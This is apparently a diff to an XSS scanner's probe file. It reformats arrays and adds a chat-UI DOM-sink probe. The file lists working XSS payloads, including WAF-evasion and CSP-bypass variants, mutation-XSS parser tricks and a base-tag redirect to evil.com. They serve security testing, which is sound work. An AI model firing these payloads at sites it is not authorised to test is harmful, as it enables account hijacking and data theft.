@@ -14,13 +14,28 @@
     "html": {
       "description": "Reflected XSS probes for HTML body context — tests raw tag injection and script execution",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword"
+      ],
       "probes": [
         {
           "payload": "<swk{{marker}}>",
           "description": "Unique marker tag injection — reflection of <swkXXXX> confirms unescaped HTML context (won't match natural tags)",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "medium",
           "confidence_boost": 30,
@@ -30,7 +45,10 @@
           "payload": "<img src=x onerror={{marker}}>",
           "description": "img onerror XSS probe to detect event handler injection in HTML context",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -40,7 +58,10 @@
           "payload": "<script>{{marker}}</script>",
           "description": "Script tag injection for classic reflected XSS",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -51,13 +72,28 @@
     "attribute": {
       "description": "Reflected XSS probes targeting HTML attribute context — breaks out of quoted attributes to inject event handlers",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword"
+      ],
       "probes": [
         {
           "payload": "\" onmouseover={{marker}} x=\"",
           "description": "Attribute breakout via double quote with injected event handler",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -67,7 +103,10 @@
           "payload": "' onmouseover={{marker}} x='",
           "description": "Attribute breakout via single quote with injected event handler",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -77,7 +116,10 @@
           "payload": "\" autofocus onfocus={{marker}} x=\"",
           "description": "Autofocus onfocus attribute injection for no-interaction XSS",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -87,14 +129,34 @@
     },
     "angular": {
       "description": "AngularJS template injection probes — tests server-side or client-side Angular expression evaluation",
-      "tech_match": ["AngularJS"],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "tech_match": [
+        "AngularJS"
+      ],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword"
+      ],
       "probes": [
         {
           "payload": "{{7*7}}",
           "description": "Angular expression evaluation probe — 49 confirms SSTI or client-side template injection",
           "matchers": [
-            {"type": "word", "words": ["49"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "49"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -104,7 +166,13 @@
           "payload": "{{constructor.constructor('alert(1)')()}}",
           "description": "Angular sandbox escape using constructor chain",
           "matchers": [
-            {"type": "word", "words": ["function"], "condition": "or"}
+            {
+              "type": "word",
+              "words": [
+                "function"
+              ],
+              "condition": "or"
+            }
           ],
           "severity": "critical",
           "confidence_boost": 75,
@@ -114,7 +182,10 @@
           "payload": "{{$on.constructor('alert(1)')()}}",
           "description": "Alternative Angular sandbox escape via $on.constructor",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
@@ -125,13 +196,23 @@
     "javascript_context": {
       "description": "XSS probes for injection inside existing <script> blocks — breaks out of string literals or script tags to execute attacker-controlled JavaScript",
       "tech_match": [],
-      "param_match": ["callback", "jsonp", "cb", "name", "user", "value"],
+      "param_match": [
+        "callback",
+        "jsonp",
+        "cb",
+        "name",
+        "user",
+        "value"
+      ],
       "probes": [
         {
           "payload": "\";alert(1)//",
           "description": "Double-quote string breakout inside script block — closes string, injects alert, comments out rest of line",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -141,7 +222,10 @@
           "payload": "'-alert(1)-'",
           "description": "Single-quote string breakout with arithmetic context — subtraction operator forces alert execution as expression",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -151,7 +235,10 @@
           "payload": "</script><script>alert(1)</script>",
           "description": "Script tag breakout — closes existing script block and opens a new one with attacker-controlled code",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -162,13 +249,32 @@
     "dom_based": {
       "description": "DOM XSS probes targeting client-side sinks — javascript: href injection, img onerror, and Angular constructor chain",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword", "url", "redirect", "next", "href"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword",
+        "url",
+        "redirect",
+        "next",
+        "href"
+      ],
       "probes": [
         {
           "payload": "javascript:alert(1)",
           "description": "javascript: pseudo-protocol in href/src — triggers in DOM sinks that set href without sanitisation",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -178,7 +284,10 @@
           "payload": "<img src=x onerror=alert(document.domain)>",
           "description": "img onerror DOM XSS probe using document.domain — confirms execution context",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -188,8 +297,17 @@
           "payload": "{{constructor.constructor('alert(1)')()}}",
           "description": "AngularJS sandbox escape via constructor chain — function in response or reflection confirms injection",
           "matchers": [
-            {"type": "word", "words": ["function"], "condition": "or"},
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "word",
+              "words": [
+                "function"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "critical",
           "confidence_boost": 70,
@@ -200,13 +318,27 @@
     "stored_indicator": {
       "description": "Stored XSS indicator payloads — unique markers designed to survive persistence and be detected on a different page",
       "tech_match": [],
-      "param_match": ["comment", "msg", "message", "body", "text", "title", "name", "bio", "description", "note"],
+      "param_match": [
+        "comment",
+        "msg",
+        "message",
+        "body",
+        "text",
+        "title",
+        "name",
+        "bio",
+        "description",
+        "note"
+      ],
       "probes": [
         {
           "payload": "<b>xss_stored_{{marker}}</b>",
           "description": "Benign bold tag with unique marker — look for reflection on a DIFFERENT page to confirm stored XSS",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "medium",
           "confidence_boost": 40,
@@ -216,7 +348,10 @@
           "payload": "\"><img src=x onerror=alert({{marker}})>",
           "description": "Attribute breakout + stored onerror probe — marker reflection on another page confirms stored XSS",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -227,13 +362,28 @@
     "waf_bypass": {
       "description": "WAF evasion XSS payloads from PayloadsAllTheThings — case mixing, string concat, unicode escapes, self-closing tags",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword"
+      ],
       "probes": [
         {
           "payload": "<svg/onload=alert(1)//",
           "description": "SVG onload with trailing double-slash comment — bypasses filters that require closing > bracket",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -243,7 +393,10 @@
           "payload": "<details open ontoggle=alert(1)>",
           "description": "HTML5 details element ontoggle — auto-fires on page load without user interaction",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -253,7 +406,10 @@
           "payload": "<img src=x onerror=window['al'+'ert'](1)>",
           "description": "String concatenation WAF bypass — splits alert keyword to evade static keyword filters",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -263,7 +419,10 @@
           "payload": "<img src=x onerror=\\u0061lert(1)>",
           "description": "Unicode escape WAF bypass — \\u0061 = 'a', bypasses filters matching literal 'alert'",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -273,7 +432,10 @@
           "payload": "<ScRiPt>{{marker}}</ScRiPt>",
           "description": "Mixed case script tag — bypasses case-sensitive keyword blacklists",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -283,7 +445,10 @@
           "payload": "<svg><script>alert&#40;1&#41;</script>",
           "description": "HTML entity encoding inside SVG script — bypasses filters checking for raw parentheses",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -293,7 +458,10 @@
           "payload": "<body onload=alert(1)>",
           "description": "Body onload injection — effective when input is injected near the top of the page body",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -304,13 +472,31 @@
     "csp_bypass": {
       "description": "CSP bypass XSS payloads -- exploit permissive CSP directives via JSONP callbacks, base-uri, trusted types, and nonce prediction",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword", "callback", "jsonp", "cb"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword",
+        "callback",
+        "jsonp",
+        "cb"
+      ],
       "probes": [
         {
           "payload": "<script src=\"/api/jsonp?callback=alert(1)//\"></script>",
           "description": "JSONP callback XSS -- script-src 'self' bypassed via same-origin JSONP endpoint reflecting callback parameter",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 60,
@@ -320,7 +506,10 @@
           "payload": "<base href=\"https://evil.com/\">",
           "description": "base-uri injection -- redirects all relative script/resource URLs to attacker domain when base-uri not restricted in CSP",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -330,7 +519,10 @@
           "payload": "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
           "description": "CSP bypass via trusted CDN (AngularJS) -- if script-src includes cdnjs or googleapis, load Angular and use template injection",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -340,7 +532,10 @@
           "payload": "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">",
           "description": "CSP override via meta tag injection -- if meta tags are injectable, overwrite CSP to allow inline scripts (only works if no HTTP header CSP)",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "medium",
           "confidence_boost": 40,
@@ -351,13 +546,31 @@
     "mxss": {
       "description": "Mutation XSS (mXSS) payloads -- exploit browser HTML parser normalization differences to bypass DOMPurify and server-side sanitizers",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword", "html", "content", "body"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword",
+        "html",
+        "content",
+        "body"
+      ],
       "probes": [
         {
           "payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
           "description": "mXSS via math/mtext context switch -- browser re-parses HTML after sanitizer, moving img out of inert context into active DOM",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -367,7 +580,10 @@
           "payload": "<svg><style><img src=x onerror=alert(1)></style></svg>",
           "description": "mXSS via SVG foreign content -- style tag in SVG is parsed differently than in HTML, img tag may escape sanitization",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -377,7 +593,10 @@
           "payload": "<form><math><mtext></form><form><mglyph><svg><mtext><style><path id=\"</style><img src=x onerror=alert(1)>\">",
           "description": "Nested namespace confusion mXSS -- multiple namespace switches confuse sanitizer tree-walking vs browser parsing",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -388,13 +607,28 @@
     "comment_breakout": {
       "description": "HTML comment and CDATA section breakout -- escape from comment context or XML CDATA sections to inject executable content",
       "tech_match": [],
-      "param_match": ["search", "q", "query", "name", "title", "comment", "msg", "text", "input", "value", "keyword"],
+      "param_match": [
+        "search",
+        "q",
+        "query",
+        "name",
+        "title",
+        "comment",
+        "msg",
+        "text",
+        "input",
+        "value",
+        "keyword"
+      ],
       "probes": [
         {
           "payload": "--><img src=x onerror=alert(1)><!--",
           "description": "HTML comment breakout -- close comment with --> then inject payload, re-open comment to maintain page structure",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 55,
@@ -404,7 +638,10 @@
           "payload": "--!><img src=x onerror=alert(1)>",
           "description": "Non-standard comment close --!> -- some browsers accept --!> as comment terminator while sanitizers may not recognize it",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
@@ -414,11 +651,46 @@
           "payload": "]]><img src=x onerror=alert(1)>",
           "description": "CDATA section breakout -- close CDATA with ]]> to inject HTML in XML/XHTML documents",
           "matchers": [
-            {"type": "reflection", "check_variants": true}
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
           ],
           "severity": "high",
           "confidence_boost": 50,
           "variables": {}
+        }
+      ]
+    },
+    "chatbot_dom_sink_2025": {
+      "description": "Chatbot / chat UI DOM XSS — input fields with placeholder *chat* / data-testid *chat* render via innerHTML / jQuery.html. 2025 AWVS context.",
+      "tech_match": [],
+      "param_match": [
+        "message",
+        "chat",
+        "prompt"
+      ],
+      "probes": [
+        {
+          "payload": "<img src=x onerror=alert(1)>",
+          "description": "Submit <img onerror> to chat input — reflected via DOM sink (innerHTML/insertAdjacentHTML/jQuery.html)",
+          "matchers": [
+            {
+              "type": "reflection",
+              "marker": "onerror=alert(1)"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {
+            "manual_chain": true
+          }
         }
       ]
     }
